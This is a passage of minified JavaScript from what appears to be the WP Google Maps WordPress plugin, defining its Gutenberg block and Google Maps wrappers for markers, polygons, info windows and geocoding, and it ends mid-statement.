Editor"))),React.createElement("p",{class:"map-block-gutenberg-button-container"},React.createElement("a",{href:"https://www.wpgmaps.com/documentation/creating-your-first-map/",target:"_blank",class:"button button-primary"},React.createElement("i",{class:"fa fa-book","aria-hidden":"true"}),t("View Documentation")))))},WPGMZA.Integration.Gutenberg.prototype.getBlockAttributes=function(){return{}},WPGMZA.Integration.Gutenberg.prototype.getBlockDefinition=function(e){var o=this;return{title:t("WP Google Maps"),description:t("The easiest to use Google Maps plugin! Create custom Google Maps with high quality markers containing locations, descriptions, images and links. Add your customized map to your WordPress posts and/or pages quickly and easily with the supplied shortcode. No fuss."),category:"common",icon:"location-alt",keywords:[t("Map"),t("Maps"),t("Google")],attributes:this.getBlockAttributes(),edit:function(e){return[!!e.isSelected&&o.getBlockInspectorControls(e),React.createElement("div",{className:e.className+" wpgmza-gutenberg-block"},React.createElement(i,{icon:"location-alt"}),React.createElement("span",{class:"wpgmza-gutenberg-block-title"},t("Your map will appear here on your websites front end")))]},save:function(){return null}}},WPGMZA.Integration.Gutenberg.getConstructor=function(){return WPGMZA.Integration.Gutenberg},WPGMZA.Integration.Gutenberg.createInstance=function(){return new(WPGMZA.Integration.Gutenberg.getConstructor())},WPGMZA.isProVersion()||/^6/.test(WPGMZA.pro_version)||(WPGMZA.integrationModules.gutenberg=WPGMZA.Integration.Gutenberg.createInstance())}})),jQuery((function(e){e(window).on("load",(function(e){var t=document.body.onclick;t&&(document.body.onclick=function(e){e.target instanceof WPGMZA.Marker||t(e)})}))})),jQuery((function(e){WPGMZA.GoogleUICompatibility=function(){if(!(navigator.vendor&&-1<navigator.vendor.indexOf("Apple")&&navigator.userAgent&&-1==navigator.userAgent.indexOf("CriOS")&&-1==navigator.userAgent.indexOf("FxiOS"))){var t=e("<style id='wpgmza-google-ui-compatiblity-fix'/>");t.html(".wpgmza_map img:not(button img) { padding:0 !important; }"),e(document.head).append(t)}},WPGMZA.googleUICompatibility=new WPGMZA.GoogleUICompatibility})),jQuery((function(e){WPGMZA.GoogleCircle=function(e,t){var o=this;WPGMZA.Circle.call(this,e,t),t?this.googleCircle=t:(this.googleCircle=new google.maps.Circle,this.googleCircle.wpgmzaCircle=this),google.maps.event.addListener(this.googleCircle,"click",(function(){o.dispatchEvent({type:"click"})})),e&&this.setOptions(e)},WPGMZA.GoogleCircle.prototype=Object.create(WPGMZA.Circle.prototype),WPGMZA.GoogleCircle.prototype.constructor=WPGMZA.GoogleCircle,WPGMZA.GoogleCircle.prototype.setCenter=function(e){WPGMZA.Circle.prototype.setCenter.apply(this,arguments),this.googleCircle.setCenter(e)},WPGMZA.GoogleCircle.prototype.setRadius=function(e){WPGMZA.Circle.prototype.setRadius.apply(this,arguments),this.googleCircle.setRadius(1e3*parseFloat(e))},WPGMZA.GoogleCircle.prototype.setVisible=function(e){this.googleCircle.setVisible(!!e)},WPGMZA.GoogleCircle.prototype.setOptions=function(t){var o={};delete(o=e.extend({},t)).map,delete o.center,t.center&&(o.center=new google.maps.LatLng({lat:parseFloat(t.center.lat),lng:parseFloat(t.center.lng)})),t.radius&&(o.radius=parseFloat(t.radius)),t.color&&(o.fillColor=t.color),t.opacity&&(o.fillOpacity=parseFloat(t.opacity),o.strokeOpacity=parseFloat(t.opacity)),this.googleCircle.setOptions(o),t.map&&t.map.addCircle(this)}})),jQuery((function(e){WPGMZA.GoogleGeocoder=function(){WPGMZA.Geocoder.call(this)},WPGMZA.GoogleGeocoder.prototype=Object.create(WPGMZA.Geocoder.prototype),WPGMZA.GoogleGeocoder.prototype.constructor=WPGMZA.GoogleGeocoder,WPGMZA.GoogleGeocoder.prototype.getGoogleGeocoder=function(){return WPGMZA.CloudAPI&&WPGMZA.CloudAPI.isBeingUsed?new WPGMZA.CloudGeocoder:new google.maps.Geocoder},WPGMZA.GoogleGeocoder.prototype.getLatLngFromAddress=function(e,t){if(!e||!e.address)throw new Error("No address specified");if(WPGMZA.isLatLngString(e.address))return WPGMZA.Geocoder.prototype.getLatLngFromAddress.call(this,e,t);e.country&&(e.componentRestrictions={country:e.country}),this.getGoogleGeocoder().geocode(e,(function(e,o){if(o==google.maps.GeocoderStatus.OK||o==WPGMZA.CloudGeocoder.SUCCESS){var n,a=e[0].geometry.location,r=null;n={lat:a.lat(),lng:a.lng()},(r=e[0].geometry.bounds)&&(r=r instanceof google.maps.LatLngBounds?WPGMZA.LatLngBounds.fromGoogleLatLngBounds(e[0].geometry.bounds):WPGMZA.LatLngBounds.fromGoogleLatLngBoundsLiteral(e[0].geometry.bounds)),t(e=[{geometry:{location:n},latLng:n,lat:n.lat,lng:n.lng,bounds:r}],WPGMZA.Geocoder.SUCCESS)}else{var i=WPGMZA.Geocoder.FAIL;o==google.maps.GeocoderStatus.ZERO_RESULTS&&(i=WPGMZA.Geocoder.ZERO_RESULTS),t(null,i)}}))},WPGMZA.GoogleGeocoder.prototype.getAddressFromLatLng=function(t,o){if(!t||!t.latLng)throw new Error("No latLng specified");var n=new WPGMZA.LatLng(t.latLng),a=this.getGoogleGeocoder();delete(t=e.extend(t,{location:{lat:n.lat,lng:n.lng}})).latLng,a.geocode(t,(function(e,t){"OK"!==t&&o(null,WPGMZA.Geocoder.FAIL),e&&e.length||o([],WPGMZA.Geocoder.NO_RESULTS),o([e[0].formatted_address],WPGMZA.Geocoder.SUCCESS)}))}})),jQuery((function(e){WPGMZA.settings.engine&&"google-maps"!=WPGMZA.settings.engine||window.google&&window.google.maps&&(WPGMZA.GoogleHTMLOverlay=function(t){this.element=e("<div class='wpgmza-google-html-overlay'></div>"),this.visible=!0,this.position=new WPGMZA.LatLng,this.setMap(t.googleMap),this.wpgmzaMap=t},WPGMZA.GoogleHTMLOverlay.prototype=new google.maps.OverlayView,WPGMZA.GoogleHTMLOverlay.prototype.onAdd=function(){this.getPanes().overlayMouseTarget.appendChild(this.element[0])},WPGMZA.GoogleHTMLOverlay.prototype.onRemove=function(){this.element&&e(this.element).parent().length&&(e(this.element).remove(),this.element=null)},WPGMZA.GoogleHTMLOverlay.prototype.draw=function(){this.updateElementPosition()},WPGMZA.GoogleHTMLOverlay.prototype.updateElementPosition=function(){var t=this.getProjection();if(t){var o=t.fromLatLngToDivPixel(this.position.toGoogleLatLng());e(this.element).css({left:o.x,top:o.y})}})})),jQuery((function(e){var t;WPGMZA.GoogleInfoWindow=function(e){t.call(this,e),this.setMapObject(e)},WPGMZA.GoogleInfoWindow.Z_INDEX=99,t=WPGMZA.isProVersion()?WPGMZA.ProInfoWindow:WPGMZA.InfoWindow,WPGMZA.GoogleInfoWindow.prototype=Object.create(t.prototype),WPGMZA.GoogleInfoWindow.prototype.constructor=WPGMZA.GoogleInfoWindow,WPGMZA.GoogleInfoWindow.prototype.setMapObject=function(e){e instanceof WPGMZA.Marker?this.googleObject=e.googleMarker:e instanceof WPGMZA.Polygon?this.googleObject=e.googlePolygon:e instanceof WPGMZA.Polyline&&(this.googleObject=e.googlePolyline)},WPGMZA.GoogleInfoWindow.prototype.createGoogleInfoWindow=function(){var e=this;this.googleInfoWindow||(this.googleInfoWindow=new google.maps.InfoWindow,this.googleInfoWindow.setZIndex(WPGMZA.GoogleInfoWindow.Z_INDEX),google.maps.event.addListener(this.googleInfoWindow,"domready",(function(t){e.trigger("domready")})),google.maps.event.addListener(this.googleInfoWindow,"closeclick",(function(t){e.state!=WPGMZA.InfoWindow.STATE_CLOSED&&(e.state=WPGMZA.InfoWindow.STATE_CLOSED,e.trigger("infowindowclose"))})))},WPGMZA.GoogleInfoWindow.prototype.open=function(o,n){var a=this;if(!t.prototype.open.call(this,o,n))return!1;this.parent=o,this.createGoogleInfoWindow(),this.setMapObject(n),this.googleObject instanceof google.maps.Polygon||this.googleInfoWindow.open(this.mapObject.map.googleMap,this.googleObject);var r,i=WPGMZA.guid(),s="<div id='"+i+"'>"+this.content+"</div>";return this.googleInfoWindow.setContent(s),r=setInterval((function(t){div=e("#"+i),div.length&&(clearInterval(r),div[0].wpgmzaMapObject=a.mapObject,div.addClass("wpgmza-infowindow"),a.element=div[0],a.trigger("infowindowopen"))}),50),!0},WPGMZA.GoogleInfoWindow.prototype.close=function(){this.googleInfoWindow&&(WPGMZA.InfoWindow.prototype.close.call(this),this.googleInfoWindow.close())},WPGMZA.GoogleInfoWindow.prototype.setContent=function(e){t.prototype.setContent.call(this,e),this.content=e,this.createGoogleInfoWindow(),this.googleInfoWindow.setContent(e)},WPGMZA.GoogleInfoWindow.prototype.setOptions=function(e){t.prototype.setOptions.call(this,e),this.createGoogleInfoWindow(),this.googleInfoWindow.setOptions(e)}})),jQuery((function($){var Parent;WPGMZA.GoogleMap=function(e,t){var o=this;if(Parent.call(this,e,t),!window.google){var n=WPGMZA.googleAPIStatus,a="Google API not loaded";if(n&&n.message&&(a+=" - "+n.message),"USER_CONSENT_NOT_GIVEN"==n.code)return;throw $(e).html("<div class='notice notice-error'><p>"+WPGMZA.localized_strings.google_api_not_loaded+"<pre>"+a+"</pre></p></div>"),new Error(a)}this.loadGoogleMap(),t&&this.setOptions(t,!0),google.maps.event.addListener(this.googleMap,"click",(function(e){var t=new WPGMZA.Event("click");t.latLng={lat:e.latLng.lat(),lng:e.latLng.lng()},o.dispatchEvent(t)})),google.maps.event.addListener(this.googleMap,"rightclick",(function(e){var t=new WPGMZA.Event("rightclick");t.latLng={lat:e.latLng.lat(),lng:e.latLng.lng()},o.dispatchEvent(t)})),google.maps.event.addListener(this.googleMap,"dragend",(function(e){o.dispatchEvent("dragend")})),google.maps.event.addListener(this.googleMap,"zoom_changed",(function(e){o.dispatchEvent("zoom_changed"),o.dispatchEvent("zoomchanged")})),google.maps.event.addListener(this.googleMap,"idle",(function(e){o.onIdle(e)})),WPGMZA.isProVersion()||(this.trigger("init"),this.dispatchEvent("created"),WPGMZA.events.dispatchEvent({type:"mapcreated",map:this}),$(this.element).trigger("wpgooglemaps_loaded"))},WPGMZA.isProVersion()?(Parent=WPGMZA.ProMap,WPGMZA.GoogleMap.prototype=Object.create(WPGMZA.ProMap.prototype)):(Parent=WPGMZA.Map,WPGMZA.GoogleMap.prototype=Object.create(WPGMZA.Map.prototype)),WPGMZA.GoogleMap.prototype.constructor=WPGMZA.GoogleMap,WPGMZA.GoogleMap.parseThemeData=function(raw){var json;try{json=JSON.parse(raw)}catch(e){try{json=eval(raw)}catch(e){var str=raw;str=str.replace(/\\'/g,"'"),str=str.replace(/\\"/g,'"'),str=str.replace(/\\0/g,"\0"),str=str.replace(/\\\\/g,"\\");try{json=eval(str)}catch(e){return console.warn("Couldn't parse theme data"),[]}}}return json},WPGMZA.GoogleMap.prototype.loadGoogleMap=function(){var e=this,t=this.settings.toGoogleMapsOptions();this.googleMap=new google.maps.Map(this.engineElement,t),google.maps.event.addListener(this.googleMap,"bounds_changed",(function(){e.onBoundsChanged()})),1==this.settings.bicycle&&this.enableBicycleLayer(!0),1==this.settings.traffic&&this.enableTrafficLayer(!0),1==this.settings.transport&&this.enablePublicTransportLayer(!0),this.showPointsOfInterest(this.settings.show_point_of_interest),$(this.engineElement).append($(this.element).find(".wpgmza-loader"))},WPGMZA.GoogleMap.prototype.setOptions=function(e,t){if(Parent.prototype.setOptions.call(this,e),e.scrollwheel&&delete e.scrollwheel,t){var o=$.extend(e,this.settings.toGoogleMapsOptions()),n=$.extend({},o);!n.center instanceof google.maps.LatLng&&(n.center instanceof WPGMZA.LatLng||"object"==typeof n.center)&&(n.center={lat:parseFloat(n.center.lat),lng:parseFloat(n.center.lng)}),"1"==this.settings.hide_point_of_interest&&(n.styles||(n.styles=[]),n.styles.push({featureType:"poi",elementType:"labels",stylers:[{visibility:"off"}]})),this.googleMap.setOptions(n)}else this.googleMap.setOptions(e)},WPGMZA.GoogleMap.prototype.addMarker=function(e){e.googleMarker.setMap(this.googleMap),Parent.prototype.addMarker.call(this,e)},WPGMZA.GoogleMap.prototype.removeMarker=function(e){e.googleMarker.setMap(null),Parent.prototype.removeMarker.call(this,e)},WPGMZA.GoogleMap.prototype.addPolygon=function(e){e.googlePolygon.setMap(this.googleMap),Parent.prototype.addPolygon.call(this,e)},WPGMZA.GoogleMap.prototype.removePolygon=function(e){e.googlePolygon.setMap(null),Parent.prototype.removePolygon.call(this,e)},WPGMZA.GoogleMap.prototype.addPolyline=function(e){e.googlePolyline.setMap(this.googleMap),Parent.prototype.addPolyline.call(this,e)},WPGMZA.GoogleMap.prototype.removePolyline=function(e){e.googlePolyline.setMap(null),Parent.prototype.removePolyline.call(this,e)},WPGMZA.GoogleMap.prototype.addCircle=function(e){e.googleCircle.setMap(this.googleMap),Parent.prototype.addCircle.call(this,e)},WPGMZA.GoogleMap.prototype.removeCircle=function(e){e.googleCircle.setMap(null),Parent.prototype.removeCircle.call(this,e)},WPGMZA.GoogleMap.prototype.addRectangle=function(e){e.googleRectangle.setMap(this.googleMap),Parent.prototype.addRectangle.call(this,e)},WPGMZA.GoogleMap.prototype.removeRectangle=function(e){e.googleRectangle.setMap(null),Parent.prototype.removeRectangle.call(this,e)},WPGMZA.GoogleMap.prototype.getCenter=function(){var e=this.googleMap.getCenter();return{lat:e.lat(),lng:e.lng()}},WPGMZA.GoogleMap.prototype.setCenter=function(e){WPGMZA.Map.prototype.setCenter.call(this,e),e instanceof WPGMZA.LatLng?this.googleMap.setCenter({lat:e.lat,lng:e.lng}):this.googleMap.setCenter(e)},WPGMZA.GoogleMap.prototype.panTo=function(e){e instanceof WPGMZA.LatLng?this.googleMap.panTo({lat:e.lat,lng:e.lng}):this.googleMap.panTo(e)},WPGMZA.GoogleMap.prototype.getZoom=function(){return this.googleMap.getZoom()},WPGMZA.GoogleMap.prototype.setZoom=function(e){if(isNaN(e))throw new Error("Value must not be NaN");return this.googleMap.setZoom(parseInt(e))},WPGMZA.GoogleMap.prototype.getBounds=function(){var e=this.googleMap.getBounds(),t=e.getNorthEast(),o=e.getSouthWest(),n=new WPGMZA.LatLngBounds({});return n.north=t.lat(),n.south=o.lat(),n.west=o.lng(),n.east=t.lng(),n.topLeft={lat:t.lat(),lng:o.lng()},n.bottomRight={lat:o.lat(),lng:t.lng()},n},WPGMZA.GoogleMap.prototype.fitBounds=function(e,t){if(e instanceof WPGMZA.LatLng&&(e={lat:e.lat,lng:e.lng}),t instanceof WPGMZA.LatLng)t={lat:t.lat,lng:t.lng};else if(e instanceof WPGMZA.LatLngBounds){var o=e;e={lat:o.south,lng:o.west},t={lat:o.north,lng:o.east}}var n=new google.maps.LatLngBounds(e,t);this.googleMap.fitBounds(n)},WPGMZA.GoogleMap.prototype.fitBoundsToVisibleMarkers=function(){for(var e=new google.maps.LatLngBounds,t=0;t<this.markers.length;t++)markers[t].getVisible()&&e.extend(markers[t].getPosition());this.googleMap.fitBounds(e)},WPGMZA.GoogleMap.prototype.enableBicycleLayer=function(e){this.bicycleLayer||(this.bicycleLayer=new google.maps.BicyclingLayer),this.bicycleLayer.setMap(e?this.googleMap:null)},WPGMZA.GoogleMap.prototype.enableTrafficLayer=function(e){this.trafficLayer||(this.trafficLayer=new google.maps.TrafficLayer),this.trafficLayer.setMap(e?this.googleMap:null)},WPGMZA.GoogleMap.prototype.enablePublicTransportLayer=function(e){this.publicTransportLayer||(this.publicTransportLayer=new google.maps.TransitLayer),this.publicTransportLayer.setMap(e?this.googleMap:null)},WPGMZA.GoogleMap.prototype.showPointsOfInterest=function(e){var t=$("textarea[name='theme_data']").val();if(t){var o=JSON.parse(t);o.push({featureType:"poi",stylers:[{visibility:e?"on":"off"}]}),this.googleMap.setOptions({styles:o})}},WPGMZA.GoogleMap.prototype.getMinZoom=function(){return parseInt(this.settings.min_zoom)},WPGMZA.GoogleMap.prototype.setMinZoom=function(e){this.googleMap.setOptions({minZoom:e,maxZoom:this.getMaxZoom()})},WPGMZA.GoogleMap.prototype.getMaxZoom=function(){return parseInt(this.settings.max_zoom)},WPGMZA.GoogleMap.prototype.setMaxZoom=function(e){this.googleMap.setOptions({minZoom:this.getMinZoom(),maxZoom:e})},WPGMZA.GoogleMap.prototype.latLngToPixels=function(e){var t=this.googleMap,o=new google.maps.LatLng({lat:parseFloat(e.lat),lng:parseFloat(e.lng)}),n=t.getProjection().fromLatLngToPoint(t.getBounds().getNorthEast()),a=t.getProjection().fromLatLngToPoint(t.getBounds().getSouthWest()),r=Math.pow(2,t.getZoom()),i=t.getProjection().fromLatLngToPoint(o);return{x:(i.x-a.x)*r,y:(i.y-n.y)*r}},WPGMZA.GoogleMap.prototype.pixelsToLatLng=function(e,t){null==t&&("x"in e&&"y"in e?(t=e.y,e=e.x):console.warn("Y coordinate undefined in pixelsToLatLng (did you mean to pass 2 arguments?)"));var o=this.googleMap,n=o.getProjection().fromLatLngToPoint(o.getBounds().getNorthEast()),a=o.getProjection().fromLatLngToPoint(o.getBounds().getSouthWest()),r=Math.pow(2,o.getZoom()),i=new google.maps.Point(e/r+a.x,t/r+n.y),s=o.getProjection().fromPointToLatLng(i);return{lat:s.lat(),lng:s.lng()}},WPGMZA.GoogleMap.prototype.onElementResized=function(e){this.googleMap&&google.maps.event.trigger(this.googleMap,"resize")},WPGMZA.GoogleMap.prototype.enableAllInteractions=function(){this.googleMap.setOptions({scrollwheel:!0,draggable:!0,disableDoubleClickZoom:!1})}})),jQuery((function(e){var t;WPGMZA.GoogleMarker=function(e){var o=this;t.call(this,e),this._opacity=1;var n={};if(e)for(var a in e)e[a]instanceof WPGMZA.LatLng?n[a]=e[a].toGoogleLatLng():e[a]instanceof WPGMZA.Map||"icon"==a||(n[a]=e[a]);this.googleMarker=new google.maps.Marker(n),(this.googleMarker.wpgmzaMarker=this).googleMarker.setPosition(new google.maps.LatLng({lat:parseFloat(this.lat),lng:parseFloat(this.lng)})),this.anim&&this.googleMarker.setAnimation(this.anim),this.animation&&this.googleMarker.setAnimation(this.animation),google.maps.event.addListener(this.googleMarker,"click",(function(){o.dispatchEvent("click"),o.dispatchEvent("select")})),google.maps.event.addListener(this.googleMarker,"mouseover",(function(){o.dispatchEvent("mouseover")})),google.maps.event.addListener(this.googleMarker,"dragend",(function(){var e=o.googleMarker.getPosition();o.setPosition({lat:e.lat(),lng:e.lng()}),o.dispatchEvent({type:"dragend",latLng:o.getPosition()})})),this.trigger("init")},t=WPGMZA.isProVersion()?WPGMZA.ProMarker:WPGMZA.Marker,WPGMZA.GoogleMarker.prototype=Object.create(t.prototype),WPGMZA.GoogleMarker.prototype.constructor=WPGMZA.GoogleMarker,Object.defineProperty(WPGMZA.GoogleMarker.prototype,"opacity",{get:function(){return this._opacity},set:function(e){this._opacity=e,this.googleMarker.setOpacity(e)}}),WPGMZA.GoogleMarker.prototype.setLabel=function(e){e?(this.googleMarker.setLabel({text:e}),this.googleMarker.getIcon()||this.googleMarker.setIcon(WPGMZA.settings.default_marker_icon)):this.googleMarker.setLabel(null)},WPGMZA.GoogleMarker.prototype.setPosition=function(e){t.prototype.setPosition.call(this,e),this.googleMarker.setPosition({lat:this.lat,lng:this.lng})},WPGMZA.GoogleMarker.prototype.updateOffset=function(){var e,t=this,o=this.googleMarker.getIcon(),n=new Image,a=this._offset.x,r=this._offset.y;o=o||WPGMZA.settings.default_marker_icon,e="string"==typeof o?{url:o}:o,n.onload=function(){var o=n.width/2,i=n.height;e.anchor=new google.maps.Point(o-a,i-r),t.googleMarker.setIcon(e)},n.src=e.url},WPGMZA.GoogleMarker.prototype.setOptions=function(e){this.googleMarker.setOptions(e)},WPGMZA.GoogleMarker.prototype.setAnimation=function(e){t.prototype.setAnimation.call(this,e),this.googleMarker.setAnimation(e)},WPGMZA.GoogleMarker.prototype.setVisible=function(e){t.prototype.setVisible.call(this,e),this.googleMarker.setVisible(!!e)},WPGMZA.GoogleMarker.prototype.getVisible=function(e){return this.googleMarker.getVisible()},WPGMZA.GoogleMarker.prototype.setDraggable=function(e){this.googleMarker.setDraggable(e)},WPGMZA.GoogleMarker.prototype.setOpacity=function(e){this.googleMarker.setOpacity(e)}})),jQuery((function(e){WPGMZA.GoogleModernStoreLocatorCircle=function(t,o){var n=this;WPGMZA.ModernStoreLocatorCircle.call(this,t,o),this.intervalID=setInterval((function(){var t={width:e(n.mapElement).width(),height:e(n.mapElement).height()};t.width==n.mapSize.width&&t.height==n.mapSize.height||(n.canvasLayer.resize_(),n.canvasLayer.draw(),n.mapSize=t)}),1e3),e(document).bind("webkitfullscreenchange mozfullscreenchange fullscreenchange",(function(){n.canvasLayer.resize_(),n.canvasLayer.draw()}))},WPGMZA.GoogleModernStoreLocatorCircle.prototype=Object.create(WPGMZA.ModernStoreLocatorCircle.prototype),WPGMZA.GoogleModernStoreLocatorCircle.prototype.constructor=WPGMZA.GoogleModernStoreLocatorCircle,WPGMZA.GoogleModernStoreLocatorCircle.prototype.initCanvasLayer=function(){var e=this;this.canvasLayer&&(this.canvasLayer.setMap(null),this.canvasLayer.setAnimate(!1)),this.canvasLayer=new CanvasLayer({map:this.map.googleMap,resizeHandler:function(t){e.onResize(t)},updateHandler:function(t){e.onUpdate(t)},animate:!0,resolutionScale:this.getResolutionScale()})},WPGMZA.GoogleModernStoreLocatorCircle.prototype.setOptions=function(e){WPGMZA.ModernStoreLocatorCircle.prototype.setOptions.call(this,e),this.canvasLayer.scheduleUpdate()},WPGMZA.GoogleModernStoreLocatorCircle.prototype.setPosition=function(e){WPGMZA.ModernStoreLocatorCircle.prototype.setPosition.call(this,e),this.canvasLayer.scheduleUpdate()},WPGMZA.GoogleModernStoreLocatorCircle.prototype.setRadius=function(e){WPGMZA.ModernStoreLocatorCircle.prototype.setRadius.call(this,e),this.canvasLayer.scheduleUpdate()},WPGMZA.GoogleModernStoreLocatorCircle.prototype.getTransformedRadius=function(e){var t=google.maps.geometry.spherical,o=this.settings.center,n=new WPGMZA.LatLng({lat:0,lng:0}),a=new WPGMZA.LatLng({lat:o.lat,lng:0}),r=t.computeOffset(n.toGoogleLatLng(),1e3*e,90),i=.006395*e*(t.computeOffset(a.toGoogleLatLng(),1e3*e,90).lng()/r.lng());if(isNaN(i))throw new Error("here");return i},WPGMZA.GoogleModernStoreLocatorCircle.prototype.getCanvasDimensions=function(){return{width:this.canvasLayer.canvas.width,height:this.canvasLayer.canvas.height}},WPGMZA.GoogleModernStoreLocatorCircle.prototype.getWorldOriginOffset=function(){var e=this.map.googleMap.getProjection().fromLatLngToPoint(this.canvasLayer.getTopLeft());return{x:-e.x,y:-e.y}},WPGMZA.GoogleModernStoreLocatorCircle.prototype.getCenterPixels=function(){var e=new WPGMZA.LatLng(this.settings.center);return this.map.googleMap.getProjection().fromLatLngToPoint(e.toGoogleLatLng())},WPGMZA.GoogleModernStoreLocatorCircle.prototype.getContext=function(e){return this.canvasLayer.canvas.getContext("2d")},WPGMZA.GoogleModernStoreLocatorCircle.prototype.getScale=function(){return Math.pow(2,this.map.getZoom())*this.getResolutionScale()},WPGMZA.GoogleModernStoreLocatorCircle.prototype.setVisible=function(e){WPGMZA.ModernStoreLocatorCircle.prototype.setVisible.call(this,e),this.canvasLayer.scheduleUpdate()},WPGMZA.GoogleModernStoreLocatorCircle.prototype.destroy=function(){this.canvasLayer.setMap(null),this.canvasLayer=null,clearInterval(this.intervalID)}})),jQuery((function(e){WPGMZA.GoogleModernStoreLocator=function(t){this.map=WPGMZA.getMapByID(t),WPGMZA.ModernStoreLocator.call(this,t);var o={fields:["name","formatted_address"],types:["geocode"]},n=wpgmaps_localize[t].other_settings.wpgmza_store_locator_restrict;this.addressInput=e(this.element).find(".addressInput, #addressInput")[0],this.addressInput&&(n&&n.length&&(o.componentRestrictions={country:n}),this.autoComplete=new google.maps.places.Autocomplete(this.addressInput,o)),this.map.googleMap.controls[google.maps.ControlPosition.TOP_CENTER].push(this.element)},WPGMZA.GoogleModernStoreLocator.prototype=Object.create(WPGMZA.ModernStoreLocator.prototype),WPGMZA.GoogleModernStoreLocator.prototype.constructor=WPGMZA.GoogleModernStoreLocator})),jQuery((function(e){var t;WPGMZA.GooglePolygon=function(o,n){var a=this;if(t.call(this,o,n),n)this.googlePolygon=n;else if(this.googlePolygon=new google.maps.Polygon,o){var r=e.extend({},o);o.polydata&&(r.paths=this.parseGeometry(o.polydata)),o.linecolor&&(r.strokeColor="#"+o.linecolor),o.lineopacity&&(r.strokeOpacity=parseFloat(o.lineopacity)),o.fillcolor&&(r.fillColor="#"+o.fillcolor),o.opacity&&(r.fillOpacity=parseFloat(o.opacity)),this.googlePolygon.setOptions(r)}this.googlePolygon.wpgmzaPolygon=this,google.maps.event.addListener(this.googlePolygon,"click",(function(){a.dispatchEvent({type:"click"})}))},t=WPGMZA.isProVersion()?WPGMZA.ProPolygon:WPGMZA.Polygon,WPGMZA.GooglePolygon.prototype=Object.create(t.prototype),WPGMZA.GooglePolygon.prototype.constructor=WPGMZA.GooglePolygon,WPGMZA.GooglePolygon.prototype.getEditable=function(){return this.googlePolygon.getOptions().editable},WPGMZA.GooglePolygon.prototype.setEditable=function(e){this.googlePolygon.setOptions({editable:e})},WPGMZA.GooglePolygon.prototype.toJSON=function(){var e=WPGMZA.Polygon.prototype.toJSON.call(this);e.points=[];for(var t=this.googlePolygon.getPath(),o=0;o<t.getLength();o++){var n=t.getAt(o);e.points.push({lat:n.lat(),lng:n.lng()})}return e}})),jQuery((function(e){WPGMZA.GooglePolyline=function(t,o){var n=this;if(WPGMZA.Polyline.call(this,t,o),o)this.googlePolyline=o;else{if(this.googlePolyline=new google.maps.Polyline(this.settings),t){var a=e.extend({},t);t.polydata&&(a.path=this.parseGeometry(t.polydata)),t.linecolor&&(a.strokeColor="#"+t.linecolor),t.linethickness&&(a.strokeWeight=parseInt(t.linethickness)),t.opacity&&(a.strokeOpacity=parseFloat(t.opacity))}if(t&&t.polydata){var r=this.parseGeometry(t.polydata);this.setPoints(r)}}this.googlePolyline.wpgmzaPolyline=this,google.maps.event.addListener(this.googlePolyline,"click",(function(){n.dispatchEvent({type:"click"})}))},WPGMZA.GooglePolyline.prototype=Object.create(WPGMZA.Polyline.prototype),WPGMZA.GooglePolyline.prototype.constructor=WPGMZA.GooglePolyline,WPGMZA.GooglePolyline.prototype.setEditable=function(e){this.googlePolyline.setOptions({editable:e})},WPGMZA.GooglePolyline.prototype.setPoints=function(e){this.googlePolyline.setOptions({path:e})},WPGMZA.GooglePolyline.prototype.toJSON=function(){var e=WPGMZA.Polyline.prototype.toJSON.call(this);e.points=[];for(var t=this.googlePolyline.getPath(),o=0;o<t.getLength();o++){var n=t.getAt(o);e.points.push({lat:n.lat(),lng:n.lng()})}return e}})),jQuery((function(e){WPGMZA.GoogleText=function(e){WPGMZA.Text.apply(this,arguments),this.overlay=new WPGMZA.GoogleTextOverlay(e)},WPGMZA.extend(WPGMZA.GoogleText,WPGMZA.Text)})),jQuery((function(e){WPGMZA.GoogleTextOverlay=function(t){this.element=e("<div class='wpgmza-google-text-overlay'><div class='wpgmza-inner'></div></div>"),(t=t||{}).position&&(this.position=t.position),t.text&&this.element.find(".wpgmza-inner").text(t.text),t.map&&this.setMap(t.map.googleMap)},window.google&&google.maps&&google.maps.OverlayView&&(WPGMZA.GoogleTextOverlay.prototype=new google.maps.OverlayView),WPGMZA.GoogleTextOverlay.prototype.onAdd=function(){var e=this.getProjection().fromLatLngToDivPixel(this.position.toGoogleLatLng());this.element.css({position:"absolute",left:e.x+"px",top:e.y+"px"}),this.getPanes().floatPane.appendChild(this.element[0])},WPGMZA.GoogleTextOverlay.prototype.draw=function(){var e=this.getProjection().fromLatLngToDivPixel(this.position.toGoogleLatLng());this.element.css({position:"absolute",left:e.x+"px",top:e.y+"px"})},WPGMZA.GoogleTextOverlay.prototype.onRemove=function(){this.element.remove()},WPGMZA.GoogleTextOverlay.prototype.hide=function(){this.element.hide()},WPGMZA.GoogleTextOverlay.prototype.show=function(){this.element.show()},WPGMZA.GoogleTextOverlay.prototype.toggle=function(){this.element.is(":visible")?this.element.hide():this.element.show()}})),jQuery((function(e){"google-maps"==WPGMZA.settings.engine&&(WPGMZA.googleAPIStatus&&"USER_CONSENT_NOT_GIVEN"==WPGMZA.googleAPIStatus.code||(WPGMZA.GoogleVertexContextMenu=function(e){var t=this;this.mapEditPage=e,this.element=document.createElement("div"),this.element.className="wpgmza-vertex-context-menu",this.element.innerHTML="Delete",google.maps.event.addDomListener(this.element,"click",(function(e){return t.removeVertex(),e.preventDefault(),e.stopPropagation(),!1}))},WPGMZA.GoogleVertexContextMenu.prototype=new google.maps.OverlayView,WPGMZA.GoogleVertexContextMenu.prototype.onAdd=function(){var e=this,t=this.getMap();this.getPanes().floatPane.appendChild(this.element),this.divListener=google.maps.event.addDomListener(t.getDiv(),"mousedown",(function(t){t.target!=e.element&&e.close()}),!0)},WPGMZA.GoogleVertexContextMenu.prototype.onRemove=function(){google.maps.event.removeListener(this.divListener),this.element.parentNode.removeChild(this.element),this.set("position"),this.set("path"),this.set("vertex")},WPGMZA.GoogleVertexContextMenu.prototype.open=function(e,t,o){this.set("position",t.getAt(o)),this.set("path",t),this.set("vertex",o),this.setMap(e),this.draw()},WPGMZA.GoogleVertexContextMenu.prototype.close=function(){this.setMap(null)},WPGMZA.GoogleVertexContextMenu.prototype.draw=function(){var e=this.get("position"),t=this.getProjection();if(e&&t){var o=t.fromLatLngToDivPixel(e);this.element.style.top=o.y+"px",this.element.style.left=o.x+"px"}},WPGMZA.GoogleVertexContextMenu.prototype.removeVertex=function(){var e=this.get("path"),t=this.get("vertex");e&&null!=t&&e.removeAt(t),this.close()}))})),jQuery((function(e){var t=WPGMZA.Circle;WPGMZA.OLCircle=function(e,o){this.center={lat:0,lng:0},this.radius=0,this.fillcolor="#ff0000",this.opacity=.6,t.call(this,e,o),this.olStyle=new ol.style.Style(this.getStyleFromSettings()),this.vectorLayer3857=this.layer=new 